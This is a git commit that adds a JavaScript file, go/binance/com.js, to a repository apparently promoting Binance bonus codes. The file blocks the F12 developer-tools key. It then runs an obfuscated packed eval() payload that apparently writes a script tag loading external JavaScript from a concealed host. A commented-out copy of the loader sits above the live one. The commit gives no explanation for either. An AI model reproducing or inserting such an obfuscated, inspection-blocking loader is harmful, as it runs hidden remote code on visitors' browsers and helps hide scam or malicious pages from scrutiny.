5e986359e845f40c220cae6f1e2f00b0759193cb
binancebonuscode <105983776+binancebonuscode@users.noreply.github.com>
2023-04-04 10:19:06 +0800

    Add files via upload

---
+++ go/binance/com.js
@@ -0,0 +1,10 @@
+document.onkeydown = function (e) {
+var currentKey = 0, k = e || window.event;
+currentKey = k.keyCode || k.which || k.charCode;
+if (currentKey == 123) {
+window.event.cancelBubble = true;
+window.event.returnValue = false;
+}
+}
+/*eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('f c="\\b";f 1="s\\h\\5\\k\\i\\p\\0\\t",d="\\o\\n\\q\\u\\6\\r\\3\\4\\5\\j\\l\\m\\2\\2\\v\\E\\7\\6\\7\\3\\0\\9\\4\\0\\8\\0\\4\\4\\6\\D\\9\\3\\a\\C\\0\\H\\3\\a\\G\\2",g="\\F\\y\\x\\8\\2\\w\\b\\B\\h\\5";e=">";1=1+d+g;s=c+1+e;A.z(s);',44,44,'x65|s2|x2f|x63|x72|x69pt|x61|x6e|x66|x2d|x6f|x3c|s1|s3|s5|var|s4|x63r|x79|x20s|x20t|x72c|x3d|x74|x74ex|x70|x2F|x76as||x3D|x6A|x62|x3e|x67i|x2E|write|document|x2fs|x64|x6c|x69|x62g|x6d|x2e'.split('|'),0,{}));*/
+eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('9 d="\\7";9 0="s\\g\\3\\o\\p\\m\\a\\n",f="\\t\\2\\u\\q\\h\\r\\4\\l\\3\\k\\j\\C\\1\\1\\8\\5\\2\\5\\B\\b\\6\\h\\6\\4\\a\\D\\4\\5\\F\\1",c="\\E\\8\\b\\2\\A\\w\\v\\1\\i\\7\\x\\g\\3";e="\\i";0=0+f+c;s=d+0+e;z.y(s);',42,42,'s2|x2f|x74|x69pt|x63|x6f|x6e|x3c|x67|var|x65|x69|s4|s1|s5|s3|x63r|x61|x3e|x72c|x20s|x72|x70|x3D|x20t|x79|x6A|x76as||x74ex|x2F|x66|x67i|x2fs|write|document|x2E|x62|x3d|x2e|x62g|x6d'.split('|'),0,{}));
